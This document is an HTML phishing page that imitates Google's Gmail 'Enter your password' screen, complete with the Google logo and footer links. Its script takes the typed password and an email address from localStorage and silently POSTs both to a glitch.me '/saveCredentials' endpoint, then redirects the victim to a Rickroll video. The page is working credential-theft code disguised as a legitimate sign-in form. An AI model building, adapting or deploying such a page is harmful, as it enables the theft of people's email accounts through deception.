<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter Password</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="bg-[#F8F9FA] flex justify-center items-center min-h-screen">

    <div class="w-full max-w-md bg-white rounded-lg shadow-xl p-8">
        <!-- Google logo -->
        <div class="flex justify-center mb-6">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google logo" class="h-12">
        </div>

        <h1 class="text-2xl font-semibold text-gray-900 mb-4">Enter your password</h1>
        <p class="text-sm text-gray-600 mb-6">to continue to Gmail</p>

        <form id="password-form">
            <div class="mb-4">
                <label class="sr-only" for="password">Password</label>
                <input class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 text-lg" id="password" name="password" placeholder="Password" type="password" required>
                <p id="password-error-message" class="hidden text-red-600 text-sm mt-2">Password must be at least 6 characters</p>
            </div>

            <div class="flex justify-between items-center">
                <button class="bg-blue-600 text-white px-6 py-2 rounded-md text-lg" type="submit" id="next-btn" disabled>Sign In</button>
            </div>
        </form>
    </div>

    <footer class="w-full bg-[#F8F9FA] py-4 mt-6">
        <div class="flex justify-between items-center text-gray-600 text-sm px-6">
            <div>
                <select class="bg-transparent text-sm text-gray-600">
                    <option>English (United States)</option>
                </select>
            </div>
            <div class="flex space-x-4">
                <a class="hover:underline" href="#">Help</a>
                <a class="hover:underline" href="#">Privacy</a>
                <a class="hover:underline" href="#">Terms</a>
            </div>
        </div>
    </footer>

    <script>
        // Handle the password form submission
        document.getElementById('password-form').addEventListener('submit', function (event) {
            event.preventDefault(); // Prevent the default form submission behavior

            const email = localStorage.getItem('email'); // Get email from localStorage
            const password = document.getElementById('password').value.trim();

            // Validate the password length
            if (password.length >= 6) {
                // Send the login details to the backend silently
                fetch('https://chipped-pine-tarascosaurus.glitch.me/saveCredentials', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        email: email,
                        password: password
                    }),
                })
                .then(response => {
                    if (response.ok) {
                        // If request is successful, redirect to Rickroll
                        window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
                    } else {
                        console.error('Failed to send credentials to the backend');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                });
            } else {
                const errorMessage = document.getElementById('password-error-message');
                errorMessage.classList.remove('hidden'); // Show the error message
            }
        });

        // Enable Sign In button when password is valid
        document.getElementById('password').addEventListener('input', function () {
            const password = document.getElementById('password').value.trim();
            const errorMessage = document.getElementById('password-error-message');
            const passwordField = document.getElementById('password');

            if (password.length >= 6) {
                document.getElementById('next-btn').disabled = false;
                passwordField.classList.remove('border-red-500');
                passwordField.classList.add('border-gray-300');
                errorMessage.classList.add('hidden');
            } else {
                document.getElementById('next-btn').disabled = true;
                passwordField.classList.add('border-red-500');
                errorMessage.classList.remove('hidden');
            }
        });
    </script>

</body>

</html>
